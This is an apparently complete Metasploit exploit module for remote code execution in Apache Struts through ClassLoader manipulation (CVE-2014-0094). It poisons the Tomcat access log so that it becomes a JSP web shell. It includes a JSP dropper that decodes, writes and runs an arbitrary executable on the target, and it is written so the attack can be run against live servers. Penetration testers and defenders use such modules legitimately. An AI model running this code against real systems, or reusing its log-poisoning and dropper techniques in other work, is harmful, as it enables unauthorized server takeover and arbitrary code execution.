# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ManualRanking # It&#039;s going to manipulate the Class Loader

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Apache Struts ClassLoader Manipulation Remote Code Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a remote command execution vulnerability in Apache Struts
        versions < 2.3.16.2. This issue is caused because the ParametersInterceptor allows
        access to &#039;class&#039; parameter which is directly mapped to getClass() method and
        allows ClassLoader manipulation, which allows remote attackers to execute arbitrary
        Java code via crafted parameters.
      },
      &#039;Author&#039;         =>
        [
          &#039;Mark Thomas&#039;, # Vulnerability Discovery
          &#039;Przemyslaw Celej&#039;, # Vulnerability Discovery
          &#039;pwntester <alvaro[at]pwntester.com>&#039;, # PoC
          &#039;Redsadic <julian.vilas[at]gmail.com>&#039; # Metasploit Module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2014-0094&#039;],
          [&#039;CVE&#039;, &#039;2014-0112&#039;],
          [&#039;URL&#039;, &#039;http://www.pwntester.com/blog/2014/04/24/struts2-0day-in-the-wild/&#039;],
          [&#039;URL&#039;, &#039;http://struts.apache.org/release/2.3.x/docs/s2-020.html&#039;]
        ],
      &#039;Platform&#039;       => %w{ linux win },
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039; => 5000,
          &#039;DisableNops&#039; => true
        },
      &#039;Targets&#039;        =>
        [
          [&#039;Java&#039;,
           {
               &#039;Arch&#039;     => ARCH_JAVA,
               &#039;Platform&#039; => %w{ linux win }
           },
          ],
          [&#039;Linux&#039;,
           {
               &#039;Arch&#039;     => ARCH_X86,
               &#039;Platform&#039; => &#039;linux&#039;
           }
          ],
          [&#039;Windows&#039;,
            {
              &#039;Arch&#039;     => ARCH_X86,
              &#039;Platform&#039; => &#039;win&#039;
            }
          ]
        ],
      &#039;DisclosureDate&#039; => &#039;Mar 06 2014&#039;,
      &#039;DefaultTarget&#039;  => 1))

      register_options(
        [
          Opt::RPORT(8080),
          OptString.new(&#039;TARGETURI&#039;, [ true, &#039;The path to a struts application action&#039;, "/struts2-blank/example/HelloWorld.action"])
        ], self.class)
  end

  def jsp_dropper(file, exe)
    dropper = <<-eos
<%@ page import=\"java.io.FileOutputStream\" %>
<%@ page import=\"sun.misc.BASE64Decoder\" %>
<%@ page import=\"java.io.File\" %>
<% FileOutputStream oFile = new FileOutputStream(\"#{file}\", false); %>
<% oFile.write(new sun.misc.BASE64Decoder().decodeBuffer(\"#{Rex::Text.encode_base64(exe)}\")); %>
<% oFile.flush(); %>
<% oFile.close(); %>
<% File f = new File(\"#{file}\"); %>
<% f.setExecutable(true); %>
<% Runtime.getRuntime().exec(\"./#{file}\"); %>
    eos

    dropper
  end

  def dump_line(uri, cmd = "")
    res = send_request_cgi({
      &#039;uri&#039;     => uri+cmd,
      &#039;version&#039; => &#039;1.1&#039;,
      &#039;method&#039;  => &#039;GET&#039;,
    })

    res
  end

  def modify_class_loader(opts)
    res = send_request_cgi({
      &#039;uri&#039;     => normalize_uri(target_uri.path.to_s),
      &#039;version&#039; => &#039;1.1&#039;,
      &#039;method&#039;  => &#039;GET&#039;,
      &#039;vars_get&#039; => {
        "class[&#039;classLoader&#039;].resources.context.parent.pipeline.first.directory"      => opts[:directory],
        "class[&#039;classLoader&#039;].resources.context.parent.pipeline.first.suffix"         => opts[:suffix],
        "class[&#039;classLoader&#039;].resources.context.parent.pipeline.first.fileDateFormat" => opts[:file_date_format]
      }
    })

    res
  end

  def check_log_file(hint)
    uri = normalize_uri("/", @jsp_file)

    print_status("#{peer} - Waiting for the server to flush the logfile")

    10.times do |x|
      select(nil, nil, nil, 2)

      # Now make a request to trigger payload
      vprint_status("#{peer} - Countdown #{10-x}...")
      res = dump_line(uri)

      # Failure. The request timed out or the server went away.
      fail_with(Failure::TimeoutExpired, "#{peer} - Not received response") if res.nil?

      # Success if the server has flushed all the sent commands to the jsp file
      if res.code == 200 && res.body && res.body.to_s =~ /#{hint}/
        print_good("#{peer} - Log file flushed at http://#{peer}/#{@jsp_file}")
        return true
      end
    end

    false
  end

  # Fix the JSP payload to make it valid once is dropped
  # to the log file
  def fix(jsp)
    output = ""
    jsp.each_line do |l|
      if l =~ /<%.*%>/
        output << l
      elsif l =~ /<%/
        next
      elsif l.chomp.empty?
        next
      else
        output << "<% #{l.chomp} %>"
      end
    end
    output
  end

  def create_jsp
    if target[&#039;Arch&#039;] == ARCH_JAVA
      jsp = fix(payload.encoded)
    else
      payload_exe = generate_payload_exe
      payload_file = rand_text_alphanumeric(4 + rand(4))
      jsp = jsp_dropper(payload_file, payload_exe)
      register_files_for_cleanup(payload_file)
    end

    jsp
  end

  def exploit
    date_format = rand_text_numeric(1+rand(4))

    # Modify the Class Loader

    print_status("#{peer} - Modifying Class Loader...")
    properties = {
      :directory      => &#039;webapps/ROOT&#039;,
      :suffix         => &#039;.jsp&#039;,
      :file_date_format => date_format
    }
    res = modify_class_loader(properties)
    unless res
      fail_with(Failure::TimeoutExpired, "#{peer} - No answer")
    end

    # Check if the log file exists and hass been flushed

    if check_log_file(normalize_uri(target_uri.to_s))
      register_files_for_cleanup(@jsp_file)
    else
      fail_with(Failure::Unknown, "#{peer} - The log file hasn&#039;t been flushed")
    end

    # Prepare the JSP
    print_status("#{peer} - Generating JSP...")
    jsp = create_jsp

    # Dump the JSP to the log file
    print_status("#{peer} - Dumping JSP into the logfile...")
    random_request = rand_text_alphanumeric(3 + rand(3))
    jsp.each_line do |l|
      unless dump_line(random_request, l.chomp)
        fail_with(Failure::Unknown, "#{peer} - Missed answer while dumping JSP to logfile...")
      end
    end

    # Check log file... enjoy shell!
    check_log_file(random_request)

    # No matter what happened, try to &#039;restore&#039; the Class Loader
    properties = {
        :directory      => &#039;&#039;,
        :suffix         => &#039;&#039;,
        :file_date_format => &#039;&#039;
    }
    modify_class_loader(properties)
  end

end

